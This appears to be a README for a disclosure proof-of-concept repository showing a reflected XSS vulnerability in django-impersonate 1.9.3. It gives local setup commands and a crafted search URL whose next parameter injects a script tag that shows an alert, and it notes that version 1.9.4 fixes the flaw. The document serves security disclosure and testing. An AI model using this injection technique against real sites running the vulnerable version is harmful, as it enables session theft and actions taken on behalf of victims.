# Proof of concept for a XSS vulnerability in django-impersonate 1.9.3

You can read the full post [here](https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/).

## Requirements

- Python
- [uv](https://docs.astral.sh/uv/getting-started/installation/)

## Set up

```bash
$ git clone https://github.com/stsewd/poc-xss-django-impersonate
$ cd poc-xss-django-impersonate
$ uv run manage.py migrate
# Create a user to log into the application.
$ uv run manage.py createsuperuser
$ uv run manage.py runserver
```

## Proof of concept

- Go to `http://127.0.0.1:8000/admin/login/`
- Log in with the user you created
- Go to `http://127.0.0.1:8000/impersonate/search/?next=?next="/><script>alert(document.domain)</script><input type="hidden`
- A popup with the domain of the page should appear

Try updating the project to use django-impersonate 1.9.4, and repeat the steps to see that the vulnerability is fixed.

```bash
$ uv add django-impersonate==1.9.4
```
